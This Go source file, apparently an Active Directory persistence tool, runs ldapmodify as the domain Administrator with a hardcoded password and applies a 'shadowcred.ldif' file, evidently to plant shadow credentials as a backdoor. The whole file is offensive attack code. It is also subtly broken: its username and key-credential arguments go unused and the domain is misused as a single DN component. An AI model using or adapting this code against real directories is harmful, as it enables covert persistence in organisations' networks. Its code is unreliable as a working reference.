package ad_persistence

import (
"os/exec"
)

type ShadowCredPersist struct {
Domain string
}

func NewShadowCredPersist(domain string) *ShadowCredPersist {
return &ShadowCredPersist{
Domain: domain,
}
}

func (s *ShadowCredPersist) Persist(username string, keyCredential string) error {
cmd := exec.Command("ldapmodify", "-x", "-h", s.Domain, "-D", "cn=Administrator,cn=Users,dc="+s.Domain, "-w", "password", "-f", "shadowcred.ldif")
output, err := cmd.Output()
if err != nil {
return err
}
print(string(output))
return nil
}
